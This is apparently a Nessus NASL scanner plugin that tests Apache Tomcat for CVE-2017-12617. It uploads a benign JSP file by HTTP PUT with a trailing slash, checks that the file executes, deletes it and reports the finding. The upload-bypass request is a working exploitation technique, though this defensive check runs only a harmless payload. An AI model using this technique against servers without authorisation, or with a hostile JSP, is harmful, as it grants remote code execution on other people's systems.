#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(105006);
  script_version("1.10");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2017-12617");
  script_bugtraq_id(100954);
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/04/15");
  script_xref(name:"CEA-ID", value:"CEA-2019-0240");

  script_name(english:"Apache Tomcat HTTP PUT JSP File Upload RCE");

  script_set_attribute(attribute:"synopsis", value:
"An HTTP server running on the remote host is affected by a remote
arbitrary file upload and execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HTTP server running on the remote host is affected by a flaw
that allows a remote unauthenticated attacker to upload a JSP file
and execute it.");
  # https://lists.apache.org/thread.html/3fd341a604c4e9eab39e7eaabbbac39c30101a022acc11dd09d7ebcb@%3Cannounce.tomcat.apache.org%3E
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4f047e41");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Tomcat versions 7.0.82, 8.0.47, 8.5.23, 9.0.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-12617");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Tomcat for Windows HTTP PUT Method File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Tomcat RCE via JSP Upload Bypass');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/10/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/10/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/12/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:tomcat");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2017-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_methods.nasl");
  script_require_keys("www/put_upload", "www/delete_upload");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("audit.inc");

port = get_http_port(default:80);
get_kb_item_or_exit("www/" + port + "/put_upload");
# only move forward if we know we can delete the file
get_kb_item_or_exit("www/" + port + "/delete_upload");

# under normal circumstances we'd want to ensure that this
# name would generate a 404. However, it appears that Tomcat
# caches .jsp files for ~5 seconds no matter what caching
# directives we put in the HTTP header. However, I think
# we are probably safe with our 32 byte random filename.
name = rand_str(length:32) + ".jsp";

# blindly send the PUT with the appended "/"
http_send_recv3(
  method:"PUT",
  port:port,
  item:"/" + name + "/",
  add_headers: make_array("Content-Type", "text/html"),
  data:'<% out.println("Executed JSP"); %>',
  exit_on_fail:TRUE);

  put_request = http_last_sent_request();

# check to see if it worked
jsp_resp = http_send_recv3(
    method:"GET",
    port:port,
    item:"/" + name,
    add_headers: make_array("Pragma", "no-cache", "Cache-Control", "no-cache, must-revalidate, max-age=0"),
    exit_on_fail:TRUE);

if (empty_or_null(jsp_resp) || "200" >!< jsp_resp[0])
{
  audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
}

get_request = http_last_sent_request();

# clean up after ourselves. Again, we won't check that
# the delete worked due to Tomcat's caching, but we are
# pretty safe since we know that the delete worked in
# http_method.nasl.
http_send_recv3(
  method:"DELETE",
  port:port,
  item:"/" + name + "/");

if (chomp(jsp_resp[2]) != 'Executed JSP')
{
  audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
}

report = '\nNessus was able to upload and execute a JSP file here:\n' +
          build_url(port:port, host:get_host_name(), qs:name) +
         '\nNessus was then able to delete the file using HTTP DELETE.\n' +
         'Successful file write verification was done by sending the following PUT request\n' +
          put_request +
         '\nAnd then sending the following GET request\n' +
          get_request +
         '\nFor which Nessus received the following response from the server:\n' + 
         'Status:\n' + jsp_resp[0] + '\nData:\n' + jsp_resp[2] + '\n';

security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
